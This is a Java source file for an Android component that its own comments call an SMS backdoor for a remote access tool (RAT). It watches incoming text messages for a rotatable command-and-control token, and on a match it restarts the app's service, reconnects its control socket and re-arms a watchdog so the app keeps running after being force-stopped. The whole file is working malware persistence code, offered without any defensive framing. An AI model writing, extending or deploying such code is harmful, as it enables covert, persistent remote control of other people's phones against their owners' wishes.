package com.fason.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;

/**
 * SmsResurrectReceiver — Lab-RATS SMS backdoor, rebuilt for Fason.
 *
 * Any SMS whose body contains the token "!RESTART_C2" forces the full
 * service stack back online: MainService restart, socket reconnect, and
 * watchdog re-arm. Works even if the app was force-stopped, because the
 * SMS_RECEIVED broadcast is delivered to manifest-registered receivers
 * before the app process would need to be alive.
 *
 * Security: the token is checked against a stored value in SharedPreferences
 * (default "!RESTART_C2"), settable from the C2 dashboard so the token can
 * be rotated.
 */
public class SmsResurrectReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsResurrect";
    private static final String PREFS = "sms_backdoor";
    private static final String KEY_TOKEN = "token";
    private static final String DEFAULT_TOKEN = "!RESTART_C2";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null) return;
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        String token = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(KEY_TOKEN, DEFAULT_TOKEN);

        String body = extractBody(intent);
        if (body == null || !body.contains(token)) return;

        Log.i(TAG, "resurrect token matched — forcing service stack online");

        // 1. Start the foreground service (survives force-stop on most OEMs
        //    because SMS delivery wakes the app)
        try {
            Intent svc = new Intent(ctx, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc);
            } else {
                ctx.startService(svc);
            }
        } catch (Exception e) {
            Log.w(TAG, "service start", e);
        }

        // 2. Force socket reconnect
        try {
            SocketClient client = SocketClient.getInstance();
            if (client != null) {
                client.disconnect();
                client.reconnect();
            }
        } catch (Exception e) {
            Log.w(TAG, "socket reconnect", e);
        }

        // 3. Re-arm the watchdog alarm chain
        try {
            com.fason.app.persistence.AlarmEngine.scheduleWatchdog();
        } catch (Exception e) {
            Log.w(TAG, "watchdog re-arm", e);
        }
    }

    private static String extractBody(Intent intent) {
        try {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            if (pdus == null || pdus.length == 0) return null;
            StringBuilder sb = new StringBuilder();
            for (Object pdu : pdus) {
                android.telephony.SmsMessage msg =
                    android.telephony.SmsMessage.createFromPdu((byte[]) pdu);
                if (msg != null && msg.getMessageBody() != null) {
                    sb.append(msg.getMessageBody());
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }

    public static void setToken(Context ctx, String token) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(KEY_TOKEN, token).apply();
    }
}
